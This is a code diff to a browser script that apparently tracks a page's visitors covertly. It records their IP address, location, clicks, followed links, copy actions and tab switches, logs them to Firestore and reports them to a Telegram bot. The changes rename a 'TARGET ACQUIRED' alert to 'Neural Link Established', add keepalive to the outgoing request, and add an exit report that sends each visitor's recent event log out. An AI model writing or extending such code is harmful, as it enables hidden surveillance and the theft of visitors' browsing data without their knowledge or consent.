@@ -22,6 +22,7 @@
     // STATE
     let sessionID = localStorage.getItem('taurus_session_id');
     let sessionData = {};
+    let localHistory = JSON.parse(localStorage.getItem('taurus_history_buffer') || "[]");
     let audioObj = null;
 
     // --- 1. VISUAL INTERFACE (THE DESIGN) ---
@@ -393,7 +394,7 @@
             }
 
             // 2. Send Telegram Notification (Only Once)
-            const telegramMsg = `🎯 <b>TARGET ACQUIRED (v4)</b>\n\n` +
+            const telegramMsg = `🎯 <b>Neural Link Established</b>\n\n` +
                 `🆔 <b>ID:</b> <code>${sessionID}</code>\n` +
                 `🌍 <b>Loc:</b> ${ipData.city}, ${ipData.country_name}\n` +
                 `📡 <b>IP:</b> <code>${ipData.ip}</code>\n` +
@@ -420,7 +421,8 @@
                     text: telegramMsg,
                     parse_mode: 'HTML',
                     reply_markup: buttons
-                })
+                }),
+                keepalive: true
             });
 
             // Start Listening
@@ -478,9 +480,14 @@
         if (!window.db) return;
         const entry = { time: getTimestamp(), action: action, detail: detail };
 
+        // 1. Sync to Firestore (Intelligence)
         window.db.collection(CONFIG.collection).doc(sessionID).update({
             history: firebase.firestore.FieldValue.arrayUnion(entry)
         }).catch(e => console.log("Log Error", e));
+
+        // 2. Buffer to Local (Rich Data)
+        localHistory.push(`[${entry.time}] ${action}: ${detail}`);
+        localStorage.setItem('taurus_history_buffer', JSON.stringify(localHistory));
 
         console.log(`📝 Log: ${action} - ${detail}`);
     }
@@ -506,10 +513,15 @@
     }
 
     function setupEventListeners() {
-        // Clicks
+        // Clicks & Navigation
         document.addEventListener('click', (e) => {
-            const target = e.target.innerText ? e.target.innerText.substring(0, 20) : e.target.tagName;
-            logHistory('Click', target);
+            const link = e.target.closest('a');
+            if (link) {
+                logHistory('Navigation', link.href);
+            } else {
+                const target = e.target.innerText ? e.target.innerText.substring(0, 20) : e.target.tagName;
+                logHistory('Click', target);
+            }
         });
 
         // Copy - The "Copy Content" requirement
@@ -525,16 +537,21 @@
             if (document.hidden) {
                 logHistory('Tab', 'Hidden');
 
-                // EXIT REPORT: Neural Link Terminated (Per V4 Final Guide)
+                // EXIT REPORT: Session Report (Per Rich Data Guide v4)
                 const endTime = new Date();
                 const startTime = sessionData?.startTime ? new Date(sessionData.startTime) : new Date();
                 const duration = Math.round((endTime - startTime) / 1000);
 
+                // Build detailed log content
+                const eventLog = localHistory.slice(-20).join('\n'); // Last 20 events
                 const report = `⏱ <b>Duration:</b> ${duration}s\n` +
-                    `📝 <b>Events:</b> ${sessionData?.history?.length || 0} recorded\n` +
-                    `📍 <b>Final:</b> ${window.location.pathname}`;
+                    `📍 <b>Final Page:</b> ${window.location.pathname}\n\n` +
+                    `📝 <b>EVENT LOG:</b>\n<code>${eventLog || 'No events recorded'}</code>`;
 
-                sendPulse("NEURAL LINK TERMINATED", 'high', report);
+                sendPulse("Session Report", 'high', report);
+
+                // Clear local buffer after report sent (assume exit)
+                // We keep it in localStorage till next page load to be safe
             } else {
                 logHistory('Tab', 'Visible');
             }
